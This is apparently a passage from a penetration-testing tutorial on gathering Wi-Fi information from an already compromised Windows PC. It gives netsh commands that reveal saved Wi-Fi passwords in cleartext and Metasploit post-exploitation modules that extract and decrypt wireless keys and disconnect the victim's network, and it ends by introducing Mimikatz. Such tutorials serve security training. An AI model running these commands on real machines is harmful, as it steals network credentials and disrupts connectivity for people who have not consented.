Working of Wi-Fi
------------------

As the name suggests, the Wi-Fi network has no physical connection between the sender and the receiver. It uses radio frequency within the electromagnetic spectrum associated with radio waves. Therefore, it is able to provide high-speed internet. Every Wi-Fi connection works through an Access Point (AP). The main job of an access point is to broadcast the signal that is further detected by electronic devices. ones the signal is detected they connect to the Wi-Fi in order to use Wi-Fi.
Types of Wi-Fi security

    Wired Equivalent Privacy
    Wi-Fi Protected Access
    Wi-Fi Protected Access 2

Netsh
-------
Now that you have a session of the victim’s PC, go to the shell and use the following command to find out the wi-fi connections of victims’ PC over the time ;

	
netsh wlan show profiles

As the above image shows, till date, the PC was connected to the Pentest Lab, Sinos, POCO PHONE, ignit. Now, we can use the following to gain detailed information about the network :
netsh wlan show networks mode=bssid


Now, use the following command to see the password of a particular wi-fi :
netsh wlan show profile name="ignit" key=clear


WLAN BSS List
--------------
This module gathers information about the wireless Basic Service Sets available to the victim machine.

e.g. this will give you SSID and other important information regarding wireless connection.
msf > use post/windows/wlan/wlan_bss_list
msf post(wlan_bss_list) > set session 5
msf post(wlan_bss_list) > exploit

WLAN Current Connection
-------------------------
This module gathers information about the current connection on each wireless LAN interface on the target machine.
msf > use post/windows/wlan/wlan_current_connection
msf post(wlan_current_connection) > set session 5
msf post(wlan_current_connection) > run

WLAN Profile
-------------
This module extracts saved Wireless LAN profiles. It will also try to decrypt the network key material. Behavior is slightly different between OS versions when it comes to WPA. In Windows Vista/7 we will get the passphrase. In Windows XP we will get the PBKDF2 derived the key.
msf post> use post/windows/wlan/wlan_profile
msf post(wlan_profile) > set session 5
msf post(wlan_profile) > exploit


WLAN Disconnect
-------------------
This module disconnects the current wireless network connection on the specified interface.
msf > use post/windows/wlan/wlan_disconnect
msf post(wlan_disconnect) > set session 5
msf post(wlan_disconnect) > exploit

Mimikatz
---------
I call it a post-exploitation toolkit because it has a lot of features, far beyond the ability to dump plain-text passwords.
